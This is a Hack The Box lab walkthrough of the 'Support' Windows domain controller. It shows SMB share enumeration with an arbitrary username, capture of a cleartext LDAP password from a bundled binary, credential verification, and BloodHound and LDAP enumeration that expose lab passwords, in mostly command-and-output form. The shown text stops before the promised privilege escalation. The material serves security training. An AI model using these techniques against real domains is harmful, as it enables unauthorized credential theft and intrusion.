---
layout: post
title: HackTheBox - Support Machine Walkthrough
categories:
- Red Teaming
tags:
- Red Team
- Pentest
- HTB
date: 2024-01-01 00:00 +0100
description: Support is an easy-difficulty Windows machine on Hack The Box (HTB) that focuses on SMB misconfigurations, LDAP credential extraction, and Kerberos-based privilege escalation.
image: assets/img/htb/support/support.jpg
---

## Introduction

**Support** is an easy-difficulty Windows machine on Hack The Box (HTB) that focuses on SMB misconfigurations, LDAP credential extraction, and Kerberos-based privilege escalation.

This walkthrough details the steps to achieve initial compromise and escalate to administrator privileges, retrieving both the `user` and `root` flags.

## Tools Used
- Nmap
- crackmapexec
- smbclient
- [**LDAPHunter**](https://github.com/GhnimiWael/LDAPHunter)
- Bloodhound
- ldapsearch
- Wireshark
- evil-winrm
- impacket suite (impacket-getST, impacket-psexec)

## Pre-Compromise Enumeration Steps
We initiated enumeration by scanning the target IP to identify open ports and services using `Nmap`:

```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ nmap -sC -sV -vv -oN nmap/support -Pn 10.10.11.174
Nmap scan report for 10.10.11.174
Host is up, received user-set (0.086s latency).
Scanned at 2025-04-22 12:26:39 EDT for 60s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-04-22 16:26:54Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-22T16:27:03
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 46731/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 33907/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 22 12:27:39 2025 -- 1 IP address (1 host up) scanned in 60.11 seconds
``` 
Based on the `nmap` result:
- The machine likely a Domain controller due the  present of Kerberos (88), DNS(53), LDAP (389,3268,3269), etc. 
- The domain name resolved from (LDA) is `support.htb`

### SMB (445/TCP) Enumeration
1. Enumerated SMB for OS banners and general information using `crackmapexec`:

```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174  
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```
- `crackmapexec` shows the machine hostname `DC` and the domain `support.htb`. (Add them both to `/etc/hosts`)

2. Enumerate shares using `crackmapexec`:

```bash                
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174 --shares
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174 --shares -u '' -p ''
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\: 
SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

- `crackmapexec` without credentials and using NULL user and password can't list any shares. But, using a random user does:

```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174 --shares -u 'DoesntExist' -p '' 
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\DoesntExist: 
SMB         10.10.11.174    445    DC               [+] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share   
```
- The result of `crackmapexec` shown an unusual shared folder: `support-tools`

### support-tools
Using `smbclient` connect and list the `support-tools` share.
```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ smbclient -N //10.10.11.174/support-tools   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

		4026367 blocks of size 4096. 952121 blocks available
smb: \> 
```
- All the files mentioned on the share are public and well-known excpe the `UserInfo.exe.zip` file seems suspicious and unsual. We can grab it using `get` command inside the `smbclient` established connection.

```bash
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (384.4 KiloBytes/sec) (average 384.4 KiloBytes/sec)
```  

### Analyzing UserInfo.exe
The `UserInfo.exe.zip` has many files, mostly of them are DLLs (Dynamic Libraries) and an executable
```bash
┌──(kali㉿kali)-[~/htb/machines/support/support_tools]
└─$ unzip -l UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    12288  2022-05-27 13:51   UserInfo.exe
    99840  2022-03-01 13:18   CommandLineParser.dll
    22144  2021-10-22 19:42   Microsoft.Bcl.AsyncInterfaces.dll
    47216  2021-10-22 19:48   Microsoft.Extensions.DependencyInjection.Abstractions.dll
    84608  2021-10-22 19:48   Microsoft.Extensions.DependencyInjection.dll
    64112  2021-10-22 19:51   Microsoft.Extensions.Logging.Abstractions.dll
    20856  2020-02-19 05:05   System.Buffers.dll
   141184  2020-02-19 05:05   System.Memory.dll
   115856  2018-05-15 09:29   System.Numerics.Vectors.dll
    18024  2021-10-22 19:40   System.Runtime.CompilerServices.Unsafe.dll
    25984  2020-02-19 05:05   System.Threading.Tasks.Extensions.dll
      563  2022-05-27 12:59   UserInfo.exe.config
---------                     -------
   652675                     12 files
```

Unzipped `UserInfo.exe.zip`:
```bash
┌──(kali㉿kali)-[~/htb/machines/support/support_tools]
└─$ unzip UserInfo.exe.zip  
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Ext
```

## Compromise
Before executing the binary, make sure to start `Wireshark` and intercept your VPN interface (for me, it's `tun0`). 

Once that's done, if PowerShell (`pwsh`) is already installed on your attacker machine, execute the binary as follows. If it's not installed, you can install it using the command `apt -y install powershell`:
```bash
╭─kali@kali ~/htb/machines/support/investigate 
╰─$ pwsh 
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(kali㉿kali)-[/home/kali/htb/machines/support/investigate]
└─PS> ./UserInfo.exe find -first fakeUser
[-] Exception: No Such Object
```
![alt text](image.png)
Then, We’ll capture the authentication in the LDAP stream as the follow
![wireshark_1](/assets/img/htb/support/wireshark_1.png)

Using `Follow TCP`, we can reveal the LDAP credentials:
![ldap_creds](/assets/img/htb/support/ldap_creds.png)

```bash
support\ldap.$nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
This can also be seen in the packet that Wireshark labels as “bindRequest”:

![ldap_creds2](/assets/img/htb/support/ldap_creds2.png)


### Verify Credentials
To verify the found crendials, we can use `crackmapexec` once again:
```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ crackmapexec smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

- Nice, the found credentials works fine !

## Post-Exploitation Enumeration Steps
### Bloodhound
Since, we have credentials and we don't have shell access, we can run `Bloodhound` python-version:
```bash
┌──(kali㉿kali)-[~/htb/machines/support]
└─$ bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174  --dns-tcp -c All --zip 
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20250422133035_bloodhound.zip

```

- Loading the `20250422133035_bloodhound.zip` into `Bloodhound`, and mark `LDAP` user as owned. But, there doesn't seem to be anything particularly interesting.

### LDAPHunter
Using [**LDAPHunter**](https://github.com/GhnimiWael/LDAPHunter) for a fast ldap scan: 
```bash
──(kali㉿kali)-[~/htb/machines/support]
└─$ ldap_hunter.py -s 10.10.11.174 -d support.htb -u ldap -P 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'


  _     ____    _    ____    _   _ _   _ _   _ _____ _____ ____  
 | |   |  _ \  / \  |  _ \  | | | | | | | \ | |_   _| ____|  _ \ 
 | |   | | | |/ _ \ | |_) | | |_| | | | |  \| | | | |  _| | |_) |
 | |___| |_| / ___ \|  __/  |  _  | |_| | |\  | | | | |___|  _ < 
 |_____|____/_/   \_\_|     |_| |_|\___/|_| \_| |_| |_____|_| \_\
                                                                  - @xW43L

          LDAP Enumeration Tool for Pentesters

[+] Successfully authenticated as ldap@support.htb

[+] Base DN: dc=support,dc=htb

[+] Enumerating user accounts...
+-------------------+-------------------+--------------------------------+--------------------------------+----------+------------------------+--------------------------------+-------------------------------+
| Username          | Name              | Description                    | Groups                         | Disabled | Password Never Expires | Last Logon                     | Email                         |
+-------------------+-------------------+--------------------------------+--------------------------------+----------+------------------------+--------------------------------+-------------------------------+
| Administrator     | Administrator     | Built-in account for           | CN=Group Policy Creator Owners | False    | False                  | 2025-04-21                     | None                          |
|                   |                   | administering the              | ,CN=Users,DC=support,DC=htb,   |          |                        | 17:31:29.891590+00:00          |                               |
|                   |                   | computer/domain                | CN=Domain Admins,CN=Users,DC=s |          |                        |                                |                               |
|                   |                   |                                | upport,DC=htb, CN=Enterprise A |          |                        |                                |                               |
|                   |                   |                                | dmins,CN=Users,DC=support,DC=h |          |                        |                                |                               |
|                   |                   |                                | tb, CN=Schema Admins,CN=Users, |          |                        |                                |                               |
|                   |                   |                                | DC=support,DC=htb, CN=Administ |          |                        |                                |                               |
|                   |                   |                                | rators,CN=Builtin,DC=support,D |          |                        |                                |                               |
|                   |                   |                                | C=htb                          |          |                        |                                |                               |
| Guest             | Guest             | Built-in account for guest     | CN=Guests,CN=Builtin,DC=suppor | False    | True                   | 1601-01-01 00:00:00+00:00      | None                          |
|                   |                   | access to the computer/domain  | t,DC=htb                       |          |                        |                                |                               |
| DC$               | DC                | None                           |                                | False    | False                  | 2025-04-22                     | None                          |
|                   |                   |                                |                                |          |                        | 17:30:40.032179+00:00          |                               |
| krbtgt            | krbtgt            | Key Distribution Center        | CN=Denied RODC Password        | True     | False                  | 1601-01-01 00:00:00+00:00      | None                          |
|                   |                   | Service Account                | Replication Group,CN=Users,DC= |          |                        |                                |                               |
|                   |                   |                                | support,DC=htb                 |          |                        |                                |                               |
| ldap              | ldap              | None                           |                                | False    | True                   | 2025-04-22                     | None                          |
|                   |                   |                                |                                |          |                        | 17:30:37.891581+00:00          |                               |
| support           | support           | None                           | CN=Shared Support Accounts,CN= | False    | True                   | 1601-01-01 00:00:00+00:00      | None                          |
|                   |                   |                                | Users,DC=support,DC=htb,       |          |                        |                                |                               |
|                   |                   |                                | CN=Remote Management Users,CN= |          |                        |                                |                               |
|                   |                   |                                | Builtin,DC=support,DC=htb      |          |                        |                                |                               |
| smith.rosario     | smith.rosario     | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | smith.rosario@support.htb     |
| hernandez.stanley | hernandez.stanley | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | hernandez.stanley@support.htb |
| wilson.shelby     | wilson.shelby     | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | wilson.shelby@support.htb     |
| anderson.damian   | anderson.damian   | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | anderson.damian@support.htb   |
| thomas.raphael    | thomas.raphael    | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | thomas.raphael@support.htb    |
| levine.leopoldo   | levine.leopoldo   | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | levine.leopoldo@support.htb   |
| raven.clifton     | raven.clifton     | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | raven.clifton@support.htb     |
| bardot.mary       | bardot.mary       | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | bardot.mary@support.htb       |
| cromwell.gerard   | cromwell.gerard   | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | cromwell.gerard@support.htb   |
| monroe.david      | monroe.david      | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | monroe.david@support.htb      |
| west.laura        | west.laura        | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | west.laura@support.htb        |
| langley.lucy      | langley.lucy      | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | langley.lucy@support.htb      |
| daughtler.mabel   | daughtler.mabel   | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | daughtler.mabel@support.htb   |
| stoll.rachelle    | stoll.rachelle    | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | stoll.rachelle@support.htb    |
| ford.victoria     | ford.victoria     | None                           |                                | False    | True                   | 1601-01-01 00:00:00+00:00      | ford.victoria@support.htb     |
+-------------------+-------------------+--------------------------------+--------------------------------+----------+------------------------+--------------------------------+-------------------------------+

[+] Interesting Findings from Standard Fields:
  - User 'Administrator' has interesting description: Built-in account for administering the computer/domain
  - Account 'Guest' has password set to never expire
  - WARNING: Active account 'Guest' has password set to never expire
  - Account 'krbtgt' is disabled
  - Account 'ldap' has password set to never expire
  - WARNING: Active account 'ldap' has password set to never expire
  - Account 'support' has password set to never expire
  - WARNING: Active account 'support' has password set to never expire
  - Account 'smith.rosario' has password set to never expire
  - WARNING: Active account 'smith.rosario' has password set to never expire
  - Account 'hernandez.stanley' has password set to never expire
  - WARNING: Active account 'hernandez.stanley' has password set to never expire
  - Account 'wilson.shelby' has password set to never expire
  - WARNING: Active account 'wilson.shelby' has password set to never expire
  - Account 'anderson.damian' has password set to never expire
  - WARNING: Active account 'anderson.damian' has password set to never expire
  - Account 'thomas.raphael' has password set to never expire
  - WARNING: Active account 'thomas.raphael' has password set to never expire
  - Account 'levine.leopoldo' has password set to never expire
  - WARNING: Active account 'levine.leopoldo' has password set to never expire
  - Account 'raven.clifton' has password set to never expire
  - WARNING: Active account 'raven.clifton' has password set to never expire
  - Account 'bardot.mary' has password set to never expire
  - WARNING: Active account 'bardot.mary' has password set to never expire
  - Account 'cromwell.gerard' has password set to never expire
  - WARNING: Active account 'cromwell.gerard' has password set to never expire
  - Account 'monroe.david' has password set to never expire
  - WARNING: Active account 'monroe.david' has password set to never expire
  - Account 'west.laura' has password set to never expire
  - WARNING: Active account 'west.laura' has password set to never expire
  - Account 'langley.lucy' has password set to never expire
  - WARNING: Active account 'langley.lucy' has password set to never expire
  - Account 'daughtler.mabel' has password set to never expire
  - WARNING: Active account 'daughtler.mabel' has password set to never expire
  - Account 'stoll.rachelle' has password set to never expire
  - WARNING: Active account 'stoll.rachelle' has password set to never expire
  - Account 'ford.victoria' has password set to never expire
  - WARNING: Active account 'ford.victoria' has password set to never expire

[+] Uncommon Fields with Values:
+-------------------+----------------------+----------------------------------------------------+
| Username          | Field                | Value                                              |
+-------------------+----------------------+----------------------------------------------------+
| Administrator     | logonCount           | 83                                                 |
| Administrator     | adminCount           | 1                                                  |
| Administrator     | badPwdCount          | 7                                                  |
| Administrator     | whenCreated          | 2022-05-28 11:01:56+00:00                          |
| Administrator     | whenChanged          | 2025-04-21 17:31:08+00:00                          |
| Guest             | whenCreated          | 2022-05-28 11:01:56+00:00                          |
| Guest             | whenChanged          | 2025-04-21 18:01:22+00:00                          |
| DC$               | servicePrincipalName | ['Dfsr-12F9A27C-BF97-4787-9364-                    |
|                   |                      | D31B6C55EB04/dc.support.htb',                      |
|                   |                      | 'ldap/dc.support.htb/ForestDnsZones.support.htb',  |
|                   |                      | 'ldap/dc.support.htb/DomainDnsZones.support.htb',  |
|                   |                      | 'DNS/dc.support.htb',                              |
|                   |                      | 'GC/dc.support.htb/support.htb',                   |
|                   |                      | 'RestrictedKrbHost/dc.support.htb',                |
|                   |                      | 'RestrictedKrbHost/DC', 'RPC/290156e5-22cb-4f1b-   |
|                   |                      | 9b96-5516d84c363c._msdcs.support.htb',             |
|                   |                      | 'HOST/DC/SUPPORT', 'HOST/dc.support.htb/SUPPORT',  |
|                   |                      | 'HOST/DC', 'HOST/dc.support.htb',                  |
|                   |                      | 'HOST/dc.support.htb/support.htb', 'E3514235-4B06- |
|                   |                      | 11D1-AB04-00C04FC2DCD2/290156e5-22cb-4f1b-9b96-    |
|                   |                      | 5516d84c363c/support.htb', 'ldap/DC/SUPPORT', 'lda |
|                   |                      | p/290156e5-22cb-4f1b-9b96-                         |
|                   |                      | 5516d84c363c._msdcs.support.htb',                  |
|                   |                      | 'ldap/dc.support.htb/SUPPORT', 'ldap/DC',          |
|                   |                      | 'ldap/dc.support.htb',                             |
|                   |                      | 'ldap/dc.support.htb/support.htb']                 |
| DC$               | logonCount           | 62                                                 |
| DC$               | whenCreated          | 2022-05-28 11:03:43+00:00                          |
| DC$               | whenChanged          | 2025-04-22 12:21:43+00:00                          |
| krbtgt            | servicePrincipalName | kadmin/changepw                                    |
| krbtgt            | adminCount           | 1                                                  |
| krbtgt            | whenCreated          | 2022-05-28 11:03:43+00:00                          |
| krbtgt            | whenChanged          | 2022-05-28 11:19:47+00:00                          |
| ldap              | logonCount           | 2                                                  |
| ldap              | whenCreated          | 2022-05-28 11:11:46+00:00                          |
| ldap              | whenChanged          | 2025-04-21 18:26:54+00:00                          |
| support           | info                 | Ironside47pleasure40Watchful                       |
| support           | whenCreated          | 2022-05-28 11:12:00+00:00                          |
| support           | whenChanged          | 2025-04-21 17:32:15+00:00                          |
| smith.rosario     | whenCreated          | 2022-05-28 11:12:19+00:00                          |
| smith.rosario     | whenChanged          | 2022-05-28 11:12:19+00:00                          |
| hernandez.stanley | whenCreated          | 2022-05-28 11:12:34+00:00                          |
| hernandez.stanley | whenChanged          | 2022-05-28 11:12:35+00:00                          |
| wilson.shelby     | whenCreated          | 2022-05-28 11:12:50+00:00                          |
| wilson.shelby     | whenChanged          | 2022-05-28 11:12:51+00:00                          |
| anderson.damian   | whenCreated          | 2022-05-28 11:13:05+00:00                          |
| anderson.damian   | whenChanged          | 2022-05-28 11:13:06+00:00                          |
| thomas.raphael    | whenCreated          | 2022-05-28 11:13:21+00:00                          |
| thomas.raphael    | whenChanged          | 2022-05-28 11:13:22+00:00                          |
| levine.leopoldo   | whenCreated          | 2022-05-28 11:13:37+00:00                          |
| levine.leopoldo   | whenChanged          | 2022-05-28 11:13:38+00:00                          |
| raven.clifton     | whenCreated          | 2022-05-28 11:13:52+00:00                          |
| raven.clifton     | whenChanged          | 2022-05-28 11:13:53+00:00                          |
| bardot.mary       | whenCreated          | 2022-05-28 11:14:08+00:00                          |
| bardot.mary       | whenChanged          | 2022-05-28 11:14:09+00:00                          |
| cromwell.gerard   | whenCreated          | 2022-05-28 11:14:24+00:00                          |
| cromwell.gerard   | whenChanged          | 2022-05-28 11:14:24+00:00                          |
| monroe.david      | whenCreated          | 2022-05-28 11:14:39+00:00                          |
| monroe.david      | whenChanged          | 2022-05-28 11:14:40+00:00                          |
| west.laura        | whenCreated          | 2022-05-28 11:14:55+00:00                          |
| west.laura        | whenChanged          | 2022-05-28 11:14:56+00:00                          |
| langley.lucy      | whenCreated          | 2022-05-28 11:15:10+00:00                          |
| langley.lucy      | whenChanged          | 2022-05-28 11:15:11+00:00                          |
| daughtler.mabel   | whenCreated          | 2022-05-28 11:15:26+00:00                          |
| daughtler.mabel   | whenChanged          | 2022-05-28 11:15:27+00:00                          |
| stoll.rachelle    | whenCreated          | 2022-05-28 11:15:42+00:00                          |
| stoll.rachelle    | whenChanged          | 2022-05-28 11:15:43+00:00                          |
| ford.victoria     | whenCreated          | 2022-05-28 11:15:57+00:00                          |
| ford.victoria     | whenChanged          | 2022-05-28 11:15:58+00:00                          |
+-------------------+----------------------+----------------------------------------------------+

[+] Enumerating groups...
+-----------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+
| Group Name                              | Description                                                                                                                                                                                                                                                                                                                                                                        | Members Count |
+-----------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+
| Administrators                          | Administrators have complete and unrestricted access to the computer/domain                                                                                                                                                                                                                                                                                                        | 3             |
| Users                                   | Users are prevented from making accidental or intentional system-wide changes and can run most applications                                                                                                                                                                                                                                                                        | 3             |
| Guests                                  | Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted                                                                                                                                                                                                                                                     | 2             |
| Print Operators                         | Members can administer printers installed on domain controllers                                                                                                                                                                                                                                                                                                                    | 0             |
| Backup Operators                        | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files                                                                                                                                                                                                                                                                          | 0             |
| Replicator                              | Supports file replication in a domain                                                                                                                                                                                                                                                                                                                                              | 0             |
| Remote Desktop Users                    | Members in this group are granted the right to logon remotely                                                                                                                                                                                                                                                                                                                      | 0             |
| Network Configuration Operators         | Members in this group can have some administrative privileges to manage configuration of networking features                                                                                                                                                                                                                                                                       | 0             |
| Performance Monitor Users               | Members of this group can access performance counter data locally and remotely                                                                                                                                                                                                                                                                                                     | 0             |
| Performance Log Users                   | Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer                                                                                                                                                                                                           | 0             |
| Distributed COM Users                   | Members are allowed to launch, activate and use Distributed COM objects on this machine.                                                                                                                                                                                                                                                                                           | 0             |
| IIS_IUSRS                               | Built-in group used by Internet Information Services.                                                                                                                                                                                                                                                                                                                              | 1             |
| Cryptographic Operators                 | Members are authorized to perform cryptographic operations.                                                                                                                                                                                                                                                                                                                        | 0             |
| Event Log Readers                       | Members of this group can read event logs from local machine                                                                                                                                                                                                                                                                                                                       | 0             |
| Certificate Service DCOM Access         | Members of this group are allowed to connect to Certification Authorities in the enterprise                                                                                                                                                                                                                                                                                        | 0             |
| RDS Remote Access Servers               | Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group. | 0             |
| RDS Endpoint Servers                    | Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.                                                               | 0             |
| RDS Management Servers                  | Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.                                                                                       | 0             |
| Hyper-V Administrators                  | Members of this group have complete and unrestricted access to all features of Hyper-V.                                                                                                                                                                                                                                                                                            | 0             |
| Access Control Assistance Operators     | Members of this group can remotely query authorization attributes and permissions for resources on this computer.                                                                                                                                                                                                                                                                  | 0             |
| Remote Management Users                 | Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.                                                                                                                                                                     | 1             |
| Storage Replica Administrators          | Members of this group have complete and unrestricted access to all features of Storage Replica.                                                                                                                                                                                                                                                                                    | 0             |
| Domain Computers                        | All workstations and servers joined to the domain                                                                                                                                                                                                                                                                                                                                  | 0             |
| Domain Controllers                      | All domain controllers in the domain                                                                                                                                                                                                                                                                                                                                               | 0             |
| Schema Admins                           | Designated administrators of the schema                                                                                                                                                                                                                                                                                                                                            | 1             |
| Enterprise Admins                       | Designated administrators of the enterprise                                                                                                                                                                                                                                                                                                                                        | 1             |
| Cert Publishers                         | Members of this group are permitted to publish certificates to the directory                                                                                                                                                                                                                                                                                                       | 0             |
| Domain Admins                           | Designated administrators of the domain                                                                                                                                                                                                                                                                                                                                            | 1             |
| Domain Users                            | All domain users                                                                                                                                                                                                                                                                                                                                                                   | 0             |
| Domain Guests                           | All domain guests                                                                                                                                                                                                                                                                                                                                                                  | 0             |
| Group Policy Creator Owners             | Members in this group can modify group policy for the domain                                                                                                                                                                                                                                                                                                                       | 1             |
| RAS and IAS Servers                     | Servers in this group can access remote access properties of users                                                                                                                                                                                                                                                                                                                 | 0             |
| Server Operators                        | Members can administer domain servers                                                                                                                                                                                                                                                                                                                                              | 0             |
| Account Operators                       | Members can administer domain user and group accounts                                                                                                                                                                                                                                                                                                                              | 0             |
| Pre-Windows 2000 Compatible Access      | A backward compatibility group which allows read access on all users and groups in the domain                                                                                                                                                                                                                                                                                      | 1             |
| Incoming Forest Trust Builders          | Members of this group can create incoming, one-way trusts to this forest                                                                                                                                                                                                                                                                                                           | 0             |
| Windows Authorization Access Group      | Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects                                                                                                                                                                                                                                                                          | 1             |
| Terminal Server License Servers         | Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage                                                                                                                                                                                                        | 0             |
| Allowed RODC Password Replication Group | Members in this group can have their passwords replicated to all read-only domain controllers in the domain                                                                                                                                                                                                                                                                        | 0             |
| Denied RODC Password Replication Group  | Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain                                                                                                                                                                                                                                                                     | 8             |
| Read-only Domain Controllers            | Members of this group are Read-Only Domain Controllers in the domain                                                                                                                                                                                                                                                                                                               | 0             |
| Enterprise Read-only Domain Controllers | Members of this group are Read-Only Domain Controllers in the enterprise                                                                                                                                                                                                                                                                                                           | 0             |
| Cloneable Domain Controllers            | Members of this group that are domain controllers may be cloned.                                                                                                                                                                                                                                                                                                                   | 0             |
| Protected Users                         | Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.                                                                                                                                                                                                         | 0             |
| Key Admins                              | Members of this group can perform administrative actions on key objects within the domain.                                                                                                                                                                                                                                                                                         | 0             |
| Enterprise Key Admins                   | Members of this group can perform administrative actions on key objects within the forest.                                                                                                                                                                                                                                                                                         | 0             |
| DnsAdmins                               | DNS Administrators Group                                                                                                                                                                                                                                                                                                                                                           | 0             |
| DnsUpdateProxy                          | DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).                                                                                                                                                                                                                                                                   | 0             |
| Shared Support Accounts                 | None                                                                                                                                                                                                                                                                                                                                                                               | 1             |
+-----------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+

[+] Privileged Groups Found:
  - Administrators (3 members)
    Members:
      CN=Domain Admins,CN=Users,DC=support,DC=htb
      CN=Enterprise Admins,CN=Users,DC=support,DC=htb
      CN=Administrator,CN=Users,DC=support,DC=htb
  - Print Operators (0 members)
  - Backup Operators (0 members)
  - Hyper-V Administrators (0 members)
